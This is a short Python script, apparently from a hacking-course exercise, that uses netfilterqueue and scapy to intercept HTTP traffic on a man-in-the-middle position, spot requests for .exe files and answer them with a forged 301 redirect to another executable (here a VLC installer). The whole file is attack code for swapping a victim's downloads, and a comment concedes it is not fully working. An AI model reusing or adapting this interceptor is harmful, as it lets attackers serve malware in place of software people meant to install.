import netfilterqueue
import scapy.all as scapy 

# This program is not functional, it only works with http websites and you must change the location

ack_list = []

def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet
    


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.IP):
        # Check if the packet has a TCP layer
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                if scapy_packet.haslayer(scapy.Raw):
                    if ".exe" in str(scapy_packet[scapy.Raw].load):
                        print("[+] exe Request")
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                        # print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    modified_packed = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://get.videolan.org/vlc/3.0.21/win32/vlc-3.0.21-win32.exe\n")
                    packet.set_payload(str(modified_packed))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()